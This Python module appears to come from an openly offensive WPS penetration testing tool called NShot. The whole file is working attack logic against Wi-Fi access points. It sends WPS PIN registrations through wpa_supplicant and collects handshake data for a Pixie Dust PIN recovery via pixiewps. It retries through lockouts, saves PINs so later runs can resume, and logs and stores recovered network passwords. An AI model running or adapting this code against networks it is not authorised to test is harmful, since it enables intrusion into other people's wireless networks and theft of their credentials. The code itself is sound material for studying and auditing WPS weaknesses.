#  NShot - WPS penetration testing utility
#  License: GPL-3.0-or-later, see LICENSE.
#  Origin and attribution: see CREDITS.md.
"""The WPS attempt: one typed outcome for one registration.

This is the deep module behind `attempt()`. The session adapter owns the
supplicant process, `protocol` owns line parsing, `radio` owns interface
recovery and `store` owns files; what remains here is the only place that
knows which outcome follows which event.
"""

import time

from dataclasses import dataclass
from src import logger
import src.wps.pixiewps as pixiewps
from src.radio import Radio
from src.store import DEFAULT_STORE
from src.wps.protocol import PixieData, parse_state_line, parse_wps_line
from src.wps.session import WpaSupplicantSession

GOT_PSK = 'GOT_PSK'
WSC_NACK = 'WSC_NACK'
WPS_FAIL = 'WPS_FAIL'
WPS_TIMEOUT = 'WPS_TIMEOUT'
RADIO_LOST = 'RADIO_LOST'
NO_PIN = 'NO_PIN'

PBC_PIN = '<PBC mode>'
NULL_PIN = '00000000'

TERMINAL_STATUSES = {WSC_NACK, GOT_PSK, WPS_FAIL}


@dataclass(frozen=True)
class AttemptResult:
    """What one WPS attempt produced."""

    outcome: str
    bssid: str = ''
    pin: str = ''
    essid: str = ''
    psk: str = ''
    locked: bool = False
    last_message: int = 0

    @property
    def ok(self) -> bool:
        return self.outcome == GOT_PSK

    @property
    def first_half_valid(self) -> bool:
        """The AP accepted the first four PIN digits (it answered M5+)."""
        return self.last_message > 5


@dataclass
class _Live:
    """Mutable state of the attempt in flight."""

    bssid: str = ''
    essid: str = ''
    psk: str = ''
    last_message: int = 0
    locked: bool = False
    status: str = ''
    disconnects: int = 0

    def clear(self) -> None:
        self.bssid = self.essid = self.psk = self.status = ''
        self.last_message = 0
        self.locked = False


class Attempt:
    """Runs WPS registrations against one interface."""

    def __init__(self, interface: str, options, *, store=None, radio=None,
                 session_factory=None, pixie_runner=pixiewps.run):
        self.interface = interface
        self.options = options
        self.store = store if store is not None else DEFAULT_STORE
        self.radio = radio if radio is not None else Radio(interface)
        self._session_factory = session_factory or (
            lambda: WpaSupplicantSession(interface)
        )
        self._pixie_runner = pixie_runner

        self.session = None
        self.data = PixieData()
        self._live = _Live()

    # -- lifecycle ---------------------------------------------------------

    def __enter__(self):
        self.open()
        return self

    def __exit__(self, *exc_info):
        self.close()
        return False

    def open(self) -> None:
        """Start the supplicant session if it is not running yet."""
        if self.session is None:
            self.session = self._session_factory()
            self.session.start()

    def close(self) -> None:
        if self.session is not None:
            self.session.close()
            self.session = None

    # -- the verb ----------------------------------------------------------

    def attempt(self, bssid: str, pin: str | None = None, *,
                pbc: bool = False, retry_on_lock: bool = True,
                save_pin_on_abort: bool = False) -> AttemptResult:
        """Register with the AP once; recover the PIN via pixiewps if enabled."""
        self.open()

        try:
            result = self._register(bssid, pin, pbc=pbc, retry_on_lock=retry_on_lock)
        except KeyboardInterrupt:
            logger.info('Aborting…')
            if save_pin_on_abort and pin:
                self.store.save_pin(bssid, pin)
            return AttemptResult(WPS_FAIL, bssid=bssid, pin=pin or '')

        if result.ok:
            self._report_success(result, pbc=pbc)
            return result

        # A NACK on the probe PIN is the expected start of Pixie Dust: the
        # rejected registration still carried the data pixiewps needs.
        if self.options.pixie_dust and not pbc:
            if not self.data.getAll():
                logger.error('Not enough data to run Pixie Dust attack')
                return AttemptResult(NO_PIN, bssid=bssid, pin=pin or '',
                                     essid=result.essid, locked=result.locked,
                                     last_message=result.last_message)

            recovered = self._pixie_runner(
                self.data, self.options.show_pixie, self.options.pixie_force
            )
            if not recovered:
                return AttemptResult(NO_PIN, bssid=bssid, pin=pin or '',
                                     essid=result.essid, locked=result.locked,
                                     last_message=result.last_message)


            return self.attempt(bssid, recovered, retry_on_lock=True,
                                save_pin_on_abort=True)

        # A rejected PIN leaves nothing to salvage; any other failure keeps the
        # PIN around so a later run can resume where this one stopped.
        if result.outcome != WSC_NACK and save_pin_on_abort and pin:
            self.store.save_pin(bssid, pin)

        return result

    def attempt_pbc(self, bssid: str | None = None) -> AttemptResult:
        """Push-button registration: the AP picks the target."""
        return self.attempt(bssid, None, pbc=True)

    # -- internals ---------------------------------------------------------

    def _report_success(self, result: AttemptResult, *, pbc: bool) -> None:
        logger.success(f'pin: {result.pin}')
        logger.success(f'WIFi: {result.essid}')
        logger.success(f'password: {result.psk}')

        if self.options.write:
            self.store.save_credentials(result.bssid, result.essid, result.pin, result.psk)

        if not pbc:
            self.store.take_pin(result.bssid)

    def _register(self, bssid: str | None, pin: str | None, *,
                  pbc: bool, retry_on_lock: bool) -> AttemptResult:
        live = self._live
        self.data.clear()
        live.clear()

        while True:  # lock retry loop
            self.data.clear()
            live.clear()
            self.session.drain()
            self.radio.reset_recoveries()

            started_at = time.time()

            if pbc:
                if bssid:
                    logger.info(f'Starting WPS push button connection to {bssid}…')
                    command = f'WPS_PBC {bssid}'
                else:
                    logger.info('Starting WPS push button connection…')
                    command = 'WPS_PBC'
            else:
                logger.info(f'Trying PIN \'{pin}\'…')
                command = f'WPS_REG {bssid} {pin}'

            if bssid:
                self.data.BSSID = bssid.upper()

            reply = self.session.send(command)
            if 'OK' not in reply:
                live.status = WPS_FAIL
                logger.error(self._explain_not_ok(command, reply))
                return self._result(bssid, pin, pbc)

            while True:
                if not self.radio.is_up():
                    if not self.radio.recover():
                        logger.error(
                            f'Interface {self.interface} is no longer UP. '
                            'Aborting connection attempt.'
                        )
                        live.status = RADIO_LOST
                        break

                    self.session.restart()
                    time.sleep(1)

                    reply = self.session.send(command)
                    if 'OK' not in reply:
                        live.status = WPS_FAIL
                        logger.error(self._explain_not_ok(command, reply))
                        return self._result(bssid, pin, pbc)

                    live.clear()
                    continue

                line = self.session.next_line()
                if not line:
                    break

                if self.options.verbose:
                    print(line)

                if not self._handle_line(line, pbc):
                    break

                if live.status in TERMINAL_STATUSES:
                    break


                if live.status == WPS_TIMEOUT:
                    elapsed = int(time.time() - started_at)
                    logger.warning(f'Received WPS-timeout after {elapsed} seconds')

                    self.session.restart()
                    time.sleep(1)

                    reply = self.session.send(command)
                    if 'OK' not in reply:
                        live.status = WPS_FAIL
                        logger.error(self._explain_not_ok(command, reply))
                        break

                    live.clear()
                    continue

            self.session.send_only('WPS_CANCEL')

            if retry_on_lock and live.locked:
                logger.warning(f'{bssid} is WPS LOCKED. Retrying in {self.options.timeout}s…')
                time.sleep(self.options.timeout)
                continue


            return self._result(bssid, pin, pbc)

    def _result(self, bssid, pin, pbc) -> AttemptResult:
        live = self._live
        if live.status == GOT_PSK:
            outcome = GOT_PSK
        elif live.locked:
            outcome = WPS_FAIL
        elif live.status:
            outcome = live.status
        else:
            outcome = WPS_FAIL


        if pbc:
            pin = PBC_PIN

        return AttemptResult(
            outcome=outcome,
            bssid=live.bssid or (bssid or ''),
            pin=pin or '',
            essid=live.essid,
            psk=live.psk,
            locked=live.locked,
            last_message=live.last_message,
        )

    def _handle_line(self, line: str, pbc: bool) -> bool:
        """Apply one supplicant line. Returns False when the attempt must end."""
        live = self._live

        if line.startswith('WPS: '):
            event = parse_wps_line(line)

            if event.kind == 'm2d':
                logger.warning('Received WPS Message M2D')
                live.status = WPS_FAIL
                live.locked = True
                logger.error('This AP is not accepting PINs right now without configuration')
                return False

            if event.kind == 'sending':
                live.last_message = event.index
                logger.info(f'Sending WPS Message M{event.index}…')

            elif event.kind == 'received':
                live.last_message = event.index
                logger.success(f'Received WPS Message M{event.index}')
                if event.index == 5:
                    logger.info('The first half of the PIN is valid')

            elif event.kind == 'nack':
                live.status = WSC_NACK
                logger.warning('Received WSC NACK')
                if live.last_message < 3:
                    live.locked = True
                    return False
                logger.error('Error: wrong PIN code')

            elif event.kind == 'hexdump':
                setattr(self.data, event.attribute, event.value)
                if self.options.show_pixie:
                    logger.info(f'{event.attribute}: {event.value}')

            elif event.kind == 'network_key':
                live.status = GOT_PSK
                live.psk = event.value

            return True

        event = parse_state_line(line, self.interface, bool(live.status))

        if event.kind == 'scanning':
            live.status = 'scanning'
            logger.info('Scanning…')
        elif event.kind == 'wps_fail':
            live.status = WPS_FAIL
            logger.warning('wpa_supplicant returned WPS-FAIL')
        elif event.kind == 'authenticating':
            live.status = 'authenticating'
            if event.essid is not None:
                live.essid = event.essid
            logger.info('Authenticating…')
        elif event.kind == 'authenticated':
            logger.success('Authenticated')
        elif event.kind == 'associating':
            live.status = 'associating'
            if event.essid is not None:
                live.essid = event.essid
            logger.info('Associating with AP…')
        elif event.kind == 'associated':
            if live.essid:
                logger.success(f'Associated with {event.bssid} (ESSID: {live.essid})')
            else:
                logger.success(f'Associated with {event.bssid}')
        elif event.kind == 'eapol_start':
            live.status = 'eapol_start'
            logger.info('Sending EAPOL Start…')
        elif event.kind == 'identity_request':
            logger.success('Received Identity Request')
        elif event.kind == 'identity_response':
            logger.info('Sending Identity Response…')
        elif event.kind == 'wps_timeout':
            live.status = WPS_TIMEOUT
        elif event.kind == 'del_station':
            live.disconnects += 1
            if live.disconnects == 5:
                logger.warning('Received NL80211 DEL_STATION too many times 🠋')
                logger.warning('This could be the result of interference, or the AP is really far')
        elif event.kind == 'selected_bss' and pbc:
            live.bssid = event.bssid
            logger.info(f'Selected AP: {event.bssid}')

        return True

    @staticmethod
    def _explain_not_ok(command: str, reply: str) -> str:
        if command.startswith(('WPS_REG', 'WPS_PBC')) and reply == 'UNKNOWN COMMAND':
            return ('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
                    'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
        return '[!] Something went wrong — check out debug log'